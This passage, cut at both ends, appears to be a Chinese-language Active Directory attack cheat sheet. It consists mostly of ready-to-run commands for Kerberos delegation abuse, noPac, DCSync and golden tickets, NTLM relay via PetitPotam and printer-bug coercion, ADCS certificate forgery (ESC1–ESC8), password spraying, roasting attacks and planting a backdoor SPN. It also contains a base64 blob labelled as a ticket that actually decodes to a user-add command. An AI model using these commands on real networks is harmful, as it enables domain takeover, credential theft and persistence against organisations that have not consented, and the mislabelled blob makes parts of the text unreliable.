error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)` \u7b80\u800c\u8a00\u4e4b\u662f\u5728\u5229\u7528\u8bc1\u4e66\u7533\u8bf7tgt\u7684\u6b65\u9aa4\u6539\u4e3a\u4ee5\u4e0b \u5c1d\u8bd5\u4f7f\u7528\u8bc1\u4e66\u8bbe\u7f6e\u65b0\u589e\u673a\u5668\u5230\u57df\u63a7\u7684\u59d4\u6d3e > openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes > python bloodyAD.py -d crashlab.local -c \":crashdc.pem\" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$' [+] CVE$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134 [+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set [+] Delegation rights modified successfully! CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy \u59d4\u6d3e\u653b\u51fb > getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*' Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating emacron [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in emacron.ccache > cp emacron.ccache /tmp/ > export KRB5CCNAME=/tmp/emacron.ccache \u8fd9\u6837\u5c31\u83b7\u5f97\u4e86tgt CVE-2021-42287/CVE-2021-42278 \u5728\u6709\u666e\u901a\u57df\u7528\u6237\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u6253\u57df\u3002 \u5229\u7528\u6f0f\u6d1e\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\uff0c\u518d\u5c06\u673a\u5668\u7528\u6237\u7684sAMAccountName\u6539\u6210\u771f\u57df\u63a7\u7684\u540d\u79f0\uff0c\u518d\u7528\u8fd9\u4e2a\u5047\u57df\u63a7\u53bb\u7533\u8bf7\u4e00\u4e2atgt\uff0c\u7533\u8bf7\u540esAMAccountName\u6539\u56de\u539f\u6765\u7684\u3002\u6b64\u65f6\u62ff\u7740tgt\u53bb\u8bf7\u6c42s4u2self\uff0c\u8fd9\u65f6KDC\u4f1a\u81ea\u52a8\u641c\u7d22\u5230\u771f\u57df\u63a7\uff0c\u5c31\u4f1a\u62ff\u5230\u771f\u57df\u63a7\u7684\u670d\u52a1\u5668\u7968\u636eST\u3002 \u56de\u8f66\u5373\u79d2 dcsync \u4fee\u6539\u5229\u7528\u65b9\u5f0fcifs\u4e3aldap\u4ee5\u4fbf\u6765dcsync \u76ee\u524d\u5de5\u5177\u4ec5\u652f\u6301\u660e\u6587\u5bc6\u7801\u3002\u6ca1\u6709\u660e\u6587\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6253\u4e0b\u4e00\u53f0\u57df\u5185\u673a\u5668\uff0c\u4e0d\u7528-user\u548c-pass\u53c2\u6570\u4e5f\u53ef\u4ee5 \u751f\u6210\u9ec4\u91d1\u7968\u636e \u5229\u7528krbtgt\u7528\u6237\u751f\u6210\u4efb\u610f\u7528\u6237\u7968\u636e\uff0c\u4ee5\u4e0b\u76f4\u63a5\u751f\u6210\u57df\u7ba1\u7968\u636e lsadump::dcsync /domain:exp1.com /user:krbtgt kerberos::golden /admin:administrator /domain:exp1.com /sid:S-1-5-21-3280894980-4031048059-2076154112 /krbtgt:0d0b0ca11c57aaedb47b02f023b636a1 /ticket:yuguan.tck rdp\u57df\u63a7 \u6709\u4e2a\u5f88\u597d\u7528\u7684\u5de5\u5177\u62ffshell\uff0c\u5f53\u7136dcsync\u4e4b\u540e\u624b\u52a8pth\u4e5f\u662f\u53ef\u4ee5\u7684 https://github.com/WazeHell/sam-the-admin python3 sam_the_admin.py \"exp/admin:123456\" -dc-ip 10.1.1.1 -shell shell\u641e\u5b8c\u76f4\u63a5\u6dfb\u52a0\u4e00\u4e2a\u57df\u7ba1\u8d26\u53f7rdp\u4e0a\u53bb Kerberos Bronze Bit Attack \u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7 \u8fd9\u91cc\u601d\u8def\u662f\u627e\u5230\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673aS1\uff0c\u518d\u5229\u7528\u8d26\u6237\u5411DC\u8bf7\u6c42\u7968\u636e\uff0c\u6700\u540e\u62ff\u7740\u7968\u636e\u653b\u51fbS2 1\uff09\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u8d26\u6237\u548c\u4e3b\u673a \u901a\u8fc7\u547d\u4ee4\u67e5\u627e 2\uff09\u62ff\u4e0b\u6743\u9650 3\uff09\u5c1d\u8bd5Kerberos Bronze Bit Attack runas /user:PC\\administrator mimikatz privilege::debug sekurlsa::ekeys 4\uff09\u8bf7\u6c42\u7968\u636e python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f exp.com/PC -force-forwardable 5\uff09PTT\u653b\u51fb export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass PC.exp.com \u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7 \u8fd9\u91cc\u601d\u8def\u662f\u5148\u62ff\u4e0b\u4e00\u4e2aS1\uff0c\u7136\u540e\u5229\u7528\u7279\u6743\u65b0\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u518d\u5229\u7528Microsoft.ActiveDirectory.Management.dll\u6dfb\u52a0\u673a\u5668\u7528\u6237\u4e0eS2\u7684\u4fe1\u4efb\u5173\u7cfb\uff0c\u518d\u6a21\u62df\u673a\u5668\u7528\u6237\u5411DC\u7533\u8bf7\u7968\u636e\uff0c\u6700\u540e\u901a\u8fc7\u7968\u636e\u767b\u5f55S2\u3002 1\uff09\u9996\u5148\u9700\u8981\u901a\u8fc7powermad\u65b0\u52a0\u5165\u4e00\u4e2a\u8ba1\u7b97\u673a\u8d26\u6237AttackerService\uff0c\u5bc6\u7801\u4e3aAttackerServicePassword\uff0c\u7528\u57df\u8d26\u6237jack\u767b\u5f55service1\u3002 \u6ce8\uff1a\u8fd9\u4e2apowermad\u5de5\u5177\u4e0d\u4ec5\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u7279\u6743\u6dfb\u52a0\u673a\u5668\u8d26\u6237\uff0c\u8fd8\u53ef\u4ee5\u6dfb\u52a0NS\u89e3\u6790\u8bb0\u5f55\u3002NS\u89e3\u6790\u8bb0\u5f55\u53ef\u7528\u4e8eHTTP\u7684NTLM RELAY\u3002 Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force) 2\uff09\u7136\u540e\u4f7f\u7528PowerShell Active Directory\u6a21\u5757\u6dfb\u52a0\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff0c\u5373\u4eceAttackerService\u5230Service2\u7684\u4f20\u5165\u4fe1\u4efb\u5173\u7cfb\u3002 Import-Module .\\Microsoft.ActiveDirectory.Management.dll Get-ADComputer AttackerService #\u786e\u8ba4\u673a\u5668\u8d26\u6237\u5df2\u7ecf\u88ab\u6dfb\u52a0 Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount 3\uff09\u8bbe\u7f6e\u597d\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u4e4b\u540e\u5c31\u53ef\u4ee5\u6a21\u62df\u7528\u6237\u7533\u8bf7\u7968\u636e\u4e86\u3002 hashes\u548caesKey\u53c2\u6570\u6765\u81ea\u4e8e\u6dfb\u52a0\u7684\u673a\u5668\u7528\u6237AttackerService\uff0cmimikatz\u53ef\u4ee5\u8ba1\u7b97 kerberos::hash /password:AttackerServicePassword /user:AttackerService python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable 4\uff09PTT\u653b\u51fb export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass PC.exp.com \u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u7ed5\u8fc7\u4e4bSPN\u52ab\u6301 https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/ \u5f53\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb\u4e2d\u65e0\u6743\u9650\u4e3a\u6dfb\u52a0\u7684\u670d\u52a1\u8bbe\u7f6e\u59d4\u6d3e\u65f6\uff0c\u5f53\u8bbe\u7f6e\u4e86\u5bf9SPN\u7684\u59d4\u6d3e\u65f6\uff0c\u53ef\u4ee5\u5229\u7528\u6b64\u65b9\u5f0f\u3002 \u5229\u7528\u65b9\u5f0f\uff1a PowerView\u67e5\u770b\u662f\u5426\u5b58\u5728SPN\u59d4\u6d3e Get-DomainComputer iis -Properties 'msds-allowedtodelegateto' \u7ed9\u76ee\u6807\u8bbe\u7f6e\u4e00\u4e2a\u540c\u6837\u7684SPN\uff08\u9700\u8981\u6709\u6743\u9650\uff09 Set-DomainObject -Identity target$ -Set @{serviceprincipalname='spn/name'} S4U\u653b\u51fb Rubeus s4u /domain:exp1.com /user:target$ /rc4:xxxxxxxxxxxxxxxx /impersonateuser:administrator /msdsspn:\"spn/name\" /nowrap MS16-075 potato\u7cfb\u5217\uff0c\u901a\u8fc7http\u534f\u8baerelay\uff0c\u518d\u53cd\u5c04\u56de\u7ed9\u672c\u673a\u7684smb\u534f\u8bae\u3002\u7528\u4f5c\u63d0\u6743 CVE-2018-8581 exchange ssrf\u6f0f\u6d1e 1\uff09\u4f7f\u7528impacket\u76d1\u542c\u7aef\u53e3\u8fdb\u884c\u7b49\u5f85\u8fde\u63a5 ntlmrelayx.py -t ldap://10.0.2.254 --no-dump -no-da -escalate-user cs 2\uff09\u53d1\u8d77\u63a8\u9001\u8ba2\u9605\u6307\u5b9a\u6240\u9700\u7684URL\uff0cExchange \u670d\u52a1\u5668\u5c06\u5c1d\u8bd5\u5411\u8fd9\u4e2aURL\u53d1\u9001\u901a\u77e5 privexchange.py -ah 10.0.2.4 owa2010sp3.exp.com -u sqladmin -p 123456 -d exp -ev 2010_SP1 3\uff09relay\u5230\u57df\u63a7\u7684ldap\u670d\u52a1\u5668\u4f1a\u81ea\u52a8\u7ed9\u666e\u901a\u7528\u6237\u6dfb\u52a0\u4e24\u53f0ACL 4\uff09dcync secretdump.py exp.com/cs:123456@OWA2010SP3.exp.com -dc-ip 10.0.2.253 -just-dc-user administrator CVE-2019-1040 smb\u9700\u8981\u7b7e\u540d\u7684MIC\u9632\u62a4\u7ed5\u8fc7\u3002 \u5728\u653b\u51fb\u673a\u8d77\u4e00\u4e2a\u76d1\u542c\uff0c\u5c06\u63a5\u6536\u7684smb\u6307\u5b9a\u4e2d\u7ee7\u5230ldap\u534f\u8bae\uff0c\u6700\u7ec8\u653b\u51fb\u76ee\u6807\u662fDC2\uff1b\u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u6216PetitPotam\u653b\u51fbDC1\uff0c\u4f7f\u5176\u5f3a\u5236\u8ba4\u8bc1\u5230\u653b\u51fb\u673a\uff0c\u653b\u51fb\u673a\u518d\u5c06NTLM\u4e2d\u7ee7\u5230DC2\u7684ldap\u534f\u8bae 1\uff09\u57df\u63a7\u6253\u6cd5 \u4f7f\u7528impacket\u76d1\u542c445\u8fdb\u884c\u7b49\u5f85\u57df\u63a7\u8fdb\u884c\u8fde\u63a5 ntlmrelayx.py -t ldap://192.168.52.100 --escalate-user test1\\$ --remove-mic --no-dump -smb2support \u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u8ba9\u57df\u63a7\u8fde\u63a5\u6211\u4eec\u7684445(\u6ce8\u610f\u653b\u51fb\u7684\u57df\u63a7\u8ddf\u56de\u8fde\u7684LDAP\u6240\u5728\u7684\u670d\u52a1\u5668\u4e0d\u8981\u5728\u540c\u4e00\u53f0\u57df\u63a7) printerbug.py exp.com/cs:123456@10.0.2.4 10.0.2.5 \u4f7f\u7528PetitPotam\u8ba9DC1\u8fde\u63a5\u653b\u51fb\u673a\u7684445\uff0c\u5e76\u4e2d\u7ee7\u5230DC2\u7684ldap python Petitpotam.py 192.168.52.100 192.168.52.129 \u53d1\u8d77win7$\u5230dc2012\u7684s4u\uff0c\u901a\u8fc7-impersonate\u53c2\u6570\u6a21\u62dfDC1\u7528\u6237administrator\u7684\u7968\u8bc1 getST.py exp.com/win7\\$ -dc-ip 10.0.2.254 -spn cifs/dc2012r2.exp.com -hashes xxxx -impersonate administrator \u4f7f\u7528administrator\u7528\u6237\u7684\u7968\u636e\u767b\u5f55\u57df\u63a7psexec\uff0c\u5bfc\u5165\u51ed\u8bc1 export KRB5CCNAME=administrator.ccache psexec.py exp1.com/administrator@dc1.exp1.com -dc-ip 192.168.52.110 -k -no-pass 2\uff09exchange\u6253\u6cd5 \u89c1exchange\u653b\u51fb\u9762 CVE-2019-1384 \u8fd9\u4e2a\u662f\u7ed5\u8fc7MS08-068\uff0c\u901a\u8fc7\u8d85\u65f6\u53d1\u9001type3 https://shenaniganslabs.io/files/impacket-ghostpotato.zip \u57df\u4fe1\u4efb\u95f4\u7684\u6a2a\u5411 \u5728\u591a\u57df\u73af\u5883\u4e2d\u53ea\u6709\u4e00\u4e2aEnterprise Admins\u7ec4\uff0c\u8be5\u7ec4\u662f\u6839\u57df\u7684\u7ba1\u7406\u5458\u7ec4\uff0c\u4e0d\u5b58\u5728\u4e8e\u5b50\u57df\u3002 \u83b7\u53d6\u5b50\u57dfSID\u548c\u5b50\u57dfkrbtgt\u7528\u6237\u7684SID\u3002 \u83b7\u53d6\u6839\u57df\u7684SID\uff0c\u4ee5\u4fbf\u7ec4\u5408\u51faEnterprise Admins\u7ec4\u7684SID\u3002 \u5e38\u89c1\u7ec4SID\u5982\u4e0b\uff1aDomain Admins\uff08S-1-5-domain-512\uff09\u3001Domain Users\uff08S-1-5-domain-513\uff09\u3001Administrator\uff08S-1-5-domain-500\uff09\u3001Enterprise Admins\uff08S-1-5-root domain-519\uff09\u3001Domain Admins\uff08S-1-5-domain-515\uff09 \u4f2a\u9020\u4e00\u4e2aSID History\u7684\u503c\u4e3aEnterprise Admins\u7684SID\u7684\u9ec4\u91d1\u7968\u636e\uff0c\u4fbf\u53ef\u5229\u7528\u8be5\u7968\u636e\u5229\u7528\u7684SID History\u6765\u5192\u5145Enterprise Admins\u7684\u7ec4\u6210\u5458\u3002 \u57df\u4fe1\u4efb\u67e5\u8be2 \u90fd\u53ef\u4ee5\u7528 nltest /domain_trusts mimikatz.exe \"lsadump::trust /patch SID\u67e5\u8be2 mimkatz\u67e5\u8be2\uff08\u67e5\u8be2\u5b50\u57df\u548c\u6839\u57df\u7684\uff09 mimikatz.exe \"lsadump::trust /patch\" powershell\u67e5\u8be2 \u67e5\u8be2\u5b50\u57df\u7684 shell powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\PowerView.ps1; Get-DomainSID}\" \u67e5\u8be2\u6839\u57df\u7684 shell powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\PowerView.ps1; Convert-NameToSid exp\\krbtgt}\" \u751f\u6210\u7968\u636e \u6807\u51c6 kerberos::golden /user:administrator /domain: /sid: /krbtgt:<KRBTGT_HASH> /sids:-519 /ptt SIDS\u662fEnterprise Admins\u7ec4\u7684SID\uff0cSID\u548chash\u662f\u5b50\u57df\u7684\u4fe1\u606f dcsync\u76f4\u63a5\u5bfc\u6839\u57df \u5f53\u7136\u4e5f\u53ef\u4ee5\u5bfc\u5b50\u57df lsadump::dcsync /domain:exp.com /all /csv \u5bfc\u51fa\u7968\u636e \u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u5bfc\u51fa\u7968\u636e sekurlsa::tickets /export ADCS\u5229\u7528\u9762 \u67e5\u627eADCS\u670d\u52a1\u5668 certutil -dump -v \u5de5\u5177\u5316 Certipy-main \u6574\u5408\u4e86ESC1-ESC8\u7684\u5229\u7528\uff0c\u8be6\u89c1Certipy-main\u6587\u4ef6\u5939\u4e0b\u7684readme certi-main\u4e5f\u6574\u5408\u4e86\u5229\u7528\uff0c\u8be6\u89c1readme ADCSKiller\u5305\u542bECS1\u548cECS8\u7684\u81ea\u52a8\u5316\u5229\u7528 https://github.com/grimlockx/ADCSKiller ADCSPwn\u5feb\u901fESC8\u5229\u7528 \u7533\u8bf7\u8bc1\u4e66 \u57df\u5185\u673a\u5668\u53ef\u4ee5\u4f7f\u7528 certmgr.msc (\u7528\u6237\u8bc1\u4e66)\uff0c certlm.msc (\u8ba1\u7b97\u673a\u8bc1\u4e66) GUI \u8bf7\u6c42\u8bc1\u4e66 \u547d\u4ee4\u5bfc\u51fa \u7528\u6237\u79c1\u94a5 certutil -user -store My mimikatz\u5f3a\u5236\u5bfc\u51fa\u5305\u542b\u79c1\u94a5\u7684\u673a\u5668\u8bc1\u4e66 privilege::debug crypto::capi crypto::certificates /systemstore:local_machine /store:my /export mimikatz\u5f3a\u5236\u5bfc\u51fa\u5305\u542b\u79c1\u94a5\u7684\u7528\u6237\u8bc1\u4e66 privilege::debug crypto::capi crypto::certificates /systemstore:CURRENT_USER /store:my /export \u641c\u7d22\u8bc1\u4e66 dir /s /b C: | findstr *.pfx | \u540e\u7f00 | \u63cf\u8ff0 | |:---------------------- |:---------------------------- | | .pfx\\ .p12\\ .pkcs12 | \u542b\u516c\u79c1\u94a5\uff0c\u901a\u5e38\u6709\u5bc6\u7801\u4fdd\u62a4 | | .pem | \u542b\u6709base64\u8bc1\u4e66\u53ca\u79c1\u94a5\uff0c\u53ef\u5229\u7528openssl\u683c\u5f0f\u8f6c\u5316 | | .key | \u53ea\u5305\u542b\u79c1\u94a5 | | .crt\\ .cer | \u53ea\u5305\u542b\u8bc1\u4e66 | | .csr | \u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\u6587\u4ef6\uff0c\u4e0d\u542b\u6709\u516c\u79c1\u94a5 | | .jks\\ .keystore\\ .keys | \u53ef\u80fd\u542b\u6709 java \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u8bc1\u4e66\u548c\u79c1\u94a5 | \u901a\u8fc7\u8bc1\u4e66\u83b7\u53d6TGT \u4f7f\u7528PKINIT\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7X.509\u8bc1\u4e66\u83b7\u53d6tgt \u8fd9\u91cc\u7684\u8bc1\u4e66\u5fc5\u987b\u662f\u5305\u542b\u79c1\u94a5\u7684pfx\u683c\u5f0f\u7684\uff0c\u9700\u8981\u77e5\u9053\u8bc1\u4e66\u5bc6\u7801 rubeus.exe asktgt /user:iis /certificate:xxx.pfx /password:123123 \u8fd8\u53ef\u4ee5\u4f7f\u7528certipy\u83b7\u53d6\uff0c\u8be6\u89c1CVE-2022-26923\u3002 \u901a\u8fc7\u8bc1\u4e66\u83b7\u53d6\u7528\u6237NTLM \u9700\u8981\u7279\u5b9a\u6a21\u677f\u53ca\u7528\u6237\u6743\u9650 kekeo tgt::pac /subject:iis /castore:current_user \u4f2a\u9020\u8bc1\u4e66-ESC1 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6ee5\u7528 \u4f7f\u7528 Certify.exe find /vulnerable \u6765\u53d1\u73b0\u5b58\u5728\u53ef\u5229\u7528\u7684\u8bc1\u4e66\u6a21\u677f \u4f7f\u7528 certutil.exe -TCAInfo \u67e5\u8be2CA\u72b6\u6001\u3002 \u5f53\u5b58\u5728\u9519\u8bef\u914d\u7f6e\u65f6\u53ef\u8fdb\u884c\u5229\u7528\u3002 Certify.exe request /ca:\"DC.exp1.com\\exp1-DC-CA\" /template:\u201dESC1\u201c /altname:administrator \u5c06\u83b7\u53d6\u7684pem\u8bc1\u4e66\u8f6c\u6362\u6210pfx openssl pkcs12 -in ~/cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out ~/cert.pfx \u5229\u7528\u8bc1\u4e66\u7533\u8bf7\u57df\u7ba1\u7684TGT Rubeus4.exe asktgt /user:Administrator /certificate:cert.pfx /password:123456 /outfile:cert.kribi /ptt \u4f2a\u9020\u8bc1\u4e66-ESC2&ESC3 \u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u6ee5\u7528 Certify.exe request /ca:\"DC.exp1.com\\exp1-DC-CA\" /template:ESC3_2 /onbehalfof:administrator /enrollcert:esc3_1.pfx /enrollcertpw:123456 \u4f2a\u9020\u8bc1\u4e66-ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 \u6ee5\u7528 \u5224\u65adCA\u662f\u5426\u5f00\u542fSAN\u6807\u8bc6\uff0c\u5982\u5b58\u5728EDITF_ATTRIBUTESUBJECTALTNAME2 \uff0c\u5219\u53ef\u5229\u7528 certutil -config \"DC.exp1.com\\exp1-DC-CA\" -getreg \"policy\\EditFlags\" \u521b\u5efa\u8bc1\u4e66\u8bf7\u6c42 certreq \u2013new usercert.inf certrequest.req #usercert.inf [NewRequest] KeyLength=2048 KeySpec=1 RequestType = PKCS10 Exportable = TRUE ExportableEncrypted = TRUE [RequestAttributes] CertificateTemplate=USER \u8bc1\u4e66\u673a\u6784\u653b\u51fb-ESC7 \u4e2d\u7ee7\u653b\u51fb-ESC8 \u5229\u7528req\u8bf7\u6c42\u5f97\u5230\u8bc1\u4e66 certreq -submit -config \"DC.exp1.com\\exp1-DC-CA\" -attrib \"SAN:upn=administrator@exp.com\" certrequest.req certrequest.cer \u7136\u540e\u5bfc\u5165cer\u540e\u5c06\u8bc1\u4e66\u5bfc\u51fapfx\u683c\u5f0f\uff0c\u518d\u83b7\u53d6tgt \u9ec4\u91d1\u8bc1\u4e66 \u5728CA\u670d\u52a1\u5668\u4e0a\u4f7f\u7528ForgeCert\u6765\u5bfc\u51fapem\u7684\u8bc1\u4e66,\u518d\u8f6c\u6362\u6210pfx Forgecert -i cert.pfx -o admin.pfx -pfx -p 123123 -op 123123 -a administrator \u5bc6\u7801\u55b7\u6d12 \u4f7f\u7528DomainPasswordSpray.ps1 https://github.com/dafthack/DomainPasswordSpray powershell.exe -exec bypass Import-Module DomainPasswordSpray.ps1 #\u679a\u4e3e\u7528\u6237\u8f93\u51fa\u6210txt Get-DomainUserList | Out-File -Encoding ascii userlist.txt #\u55b7\u6d12 Invoke-DomainPasswordSpray -UserList users.txt -Domain exp.com -PasswordList passlist.txt -OutFile sprayed-creds.txt AS-REPRoasting \u5982\u679c\u5b58\u5728\u8bbe\u7f6e\u4e86\u9009\u9879\u4e0d\u9700\u8981kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u653b\u51fb \u67e5\u627e\u5177\u6709\u6b64\u5c5e\u6027\u7684\u7528\u6237 Import-Module .\\PowerView.ps1 Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose \u53d1\u5305\u4e14\u76d1\u542c Rubeus.exe asreproast Rubeus.exe asreproast /dc:xxx GPP\u5229\u7528 \u8bfb\u53d6\u7ec4\u7b56\u7565\u6587\u4ef6 dir /s /a \\\\DC.exp.com\\SYSVOL\\exp.com\\*.xml powershell import-modulo .\\Get-GPPpassword.ps1;Get-GppPassword kerberoasting \u5176\u539f\u7406\u5728\u4e8e\u5148\u7528LDAP\u67e5\u8be2\u4e8e\u57df\u7684spn\uff0c\u518d\u901a\u8fc7\u53d1\u9001TGS\u5305\uff0c\u63d0\u53d6\u62fc\u63a5\u5f97\u5230hashcat\u6216\u8005john\u80fd\u7206\u7834\u7684\u683c\u5f0f\u3002 python3 targetedKerberoast.py -v -d exp1.com -u user -p xx rubeus\u653b\u51fb\u76f4\u63a5\u4e00\u952e\u5316\u4e86\u3002 \u53d1\u5305\u5e76\u76d1\u542c rubeus.exe kerberoast kirbi\u7968\u636e\u7834\u89e3 python tgsrepcrack.py mima.txt 123.kirbi \u7559\u540e\u95e8 \u7ed9\u7ba1\u7406\u5458\u6ce8\u518c\u4e00\u4e2aUNC\u7684\u670d\u52a1\u7559\u540e\u95e8\uff0c\u968f\u65f6\u53ef\u4ee5\u62ff\u8bfb\u7ba1\u7406\u5458kirbi setspn -U -A UNC/dc.exp.com administrator \u59d4\u6d3e\u653b\u51fb \u5728adsiedit.msc\u53ef\u4ee5\u6253\u5f00ADSI\u7f16\u8f91\u5668\u94fe\u63a5LDAP\u3002 Kerberos \u59d4\u6d3e\u662f\u4e00\u79cd\u5141\u8bb8\u670d\u52a1\u5c06\u7528\u6237\u6a21\u62df\u53ef\u4ee5\u8bbf\u95ee\u5230\u5176\u4ed6\u670d\u52a1\u7684\u673a\u5236\u3002\u4f8b\u5982\uff0c\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u524d\u7aef\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u8be5\u5e94\u7528\u7a0b\u5e8f\u53c8\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u7684\u6807\u8bc6\u548c\u6743\u9650\u8bbf\u95ee\u540e\u7aef API\u3002 \u914d\u7f6e\u65e0\u7ea6\u675f\u59d4\u6d3e\u548c\u7ea6\u675f\u59d4\u6d3e\u9700\u8981 SeEnable\u59d4\u6d3e\u6743\u9650\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u6743\u9650\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u7528\u6237\u5bf9 AD \u5e10\u6237\u5177\u6709\u5b8c\u5168\u63a7\u5236 \uff08GenericAll\uff09\uff0c\u5982\u679c\u4e0d\u5177\u6709 SeEnableDelegation \u7279\u6743\uff0c\u4ed6\u4e5f\u65e0\u6cd5\u914d\u7f6e\u8fd9\u4e9b Kerberos \u59d4\u6d3e\u7c7b\u578b\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\u3002\u4e0e\u65e0\u7ea6\u675f\u59d4\u6d3e\u548c\u7ea6\u675f\u59d4\u6d3e\u4e0d\u540c\uff0cRBCD \u8981\u6c42\u6709\u6743\u66f4\u6539 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\uff0c\u4f46\u6ca1\u6709\u7279\u6743\u3002 \u975e\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb \u975e\u7ea6\u675f\u59d4\u6d3e\u8981\u6c42\u7528\u6237\u5c06\u5176\u7968\u8bc1\u6388\u4e88\u7968\u8bc1 \uff08TGT\uff09 \u53d1\u9001\u5230\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 A\uff09\u3002\u7136\u540e\uff0c\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668A\uff09\u53ef\u4ee5\u4f7f\u7528\u8be5\u7968\u8bc1\u5c06\u7528\u6237\u6a21\u62df\u5230\u4efb\u4f55\u670d\u52a1\uff0c\u5305\u62ec\u540e\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 B\uff09\u3002 \u56e0\u4e3a\u53ef\u4ee5\u6a21\u62df\u5230\u4efb\u4f55\u670d\u52a1\uff0c\u6240\u4ee5\u53eb\u975e\u7ea6\u675f\u7684\u3002 \u653b\u51fb\u5229\u7528\uff1a 1.\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u673a\u5668\u8d26\u6237\uff08\u4f7f\u7528\u547d\u4ee4\uff09 2.\u62ff\u4e0b\u6743\u9650 3.\u76d1\u542c\u6765\u81eaDC\u7684\u8bbf\u95ee \u9700\u8981\u4ee5\u673a\u5668\u7528\u6237\u7684\u6743\u9650\u8fd0\u884c\uff0c\u4e5f\u5c31\u662fsystem Rubeus.exe monitor /interval:1 /filteruser:dc$ 4.\u89e6\u53d1NTLM\u4e2d\u7ee7\uff0c\u5f97\u5230\u57df\u63a7\u7684\u7968\u636e a.\u6253\u5370\u673a\u6f0f\u6d1e b.\u5176\u4ed6UNC\u65b9\u5f0f\uff0c\u9700\u8981\u57df\u7ba1\u4ea4\u4e92 5.\u5bfc\u5165base64\u7684ticket .\\Rubeus.exe ptt /ticket:base64 mimikatz\u5bfc\u51fa\u7968\u636e privilege::debug sekurlsa::tickets /export \u8fd8\u53ef\u901a\u8fc7powershell\u5199\u6210\u7968\u636e\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528rubeus\u76f4\u63a5\u5bfc\u51fa [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"Y21kIC9jIG5ldCB1c2VyIGJ5cGFzc3VhYyAxMjM0NTYgL2FkZA==\")) PTT kerberos::ptt 1.kirbi lsadump::dcsync /domain:test.local /all /csv \u7ea6\u675f\u59d4\u6d3e\u653b\u51fb \u7ea6\u675f\u59d4\u6d3e\u5141\u8bb8\u524d\u7aef\u670d\u52a1\uff08\u670d\u52a1\u5668 A\uff09\u83b7\u53d6 Kerberos \u670d\u52a1\u7968\u8bc1\uff0c\u4ee5\u4fbf\u7528\u6237\u8bbf\u95ee\u7531\u5176\u670d\u52a1\u4e3b\u4f53\u540d\u79f0 \uff08SPN\uff09 